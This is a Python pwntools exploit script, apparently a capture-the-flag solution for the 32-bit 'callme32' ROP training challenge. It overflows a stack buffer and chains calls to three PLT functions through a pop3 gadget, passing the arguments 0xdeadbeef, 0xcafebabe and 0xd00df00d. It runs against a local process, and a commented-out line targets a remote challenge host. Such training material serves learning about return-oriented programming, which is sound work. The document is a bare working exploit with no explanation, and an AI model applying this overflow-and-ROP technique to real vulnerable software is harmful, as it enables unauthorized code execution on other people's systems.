from pwn import *
from pwn import p32
import socket
from ctypes import *
context(arch='i386', os='linux', log_level='DEBUG')

# host = "node.yuzhian.com.cn"
# ip = socket.gethostbyname(host)
# r = remote(ip,37506)#远程连接
# elf = cdll.LoadLibrary('./libcallme32.so')
r = process("./callme32")
addr_one_plt = 0x80484f0
addr_two_plt = 0x8048550
addr_three_plt = 0x80484e0

addr_one = 0x08048780
addr_two = 0x0804876F
addr_three = 0x0804875E

a1 = 0x0DEADBEEF
a2 = 0x0CAFEBABE
a3 = 0x0D00DF00D

pop3_addr = 0x080487f9
esp8_pop1_addr = 0x080484aa

payload = b'A' * 0x28 + b'junk'
payload += p32(addr_one_plt) + p32(pop3_addr) + p32(a1) + p32(a2) + p32(a3)
payload += p32(addr_two_plt) + p32(pop3_addr) + p32(a1) + p32(a2) + p32(a3)
payload += p32(addr_three_plt) + p32(pop3_addr) + p32(a1) + p32(a2) + p32(a3)

# 32位传参 上

# payload = b'A' * 0x28 + b'junk'
# payload += p32(addr_one) + p32(a1) + p32(a2) + p32(a3)
# payload += p32(addr_two)  + p32(a1) + p32(a2) + p32(a3)
# payload += p32(addr_three) + p32(a1) + p32(a2) + p32(a3)

# 32位传参 下有exit()

# pause()


r.sendlineafter(b">", payload)

r.interactive()
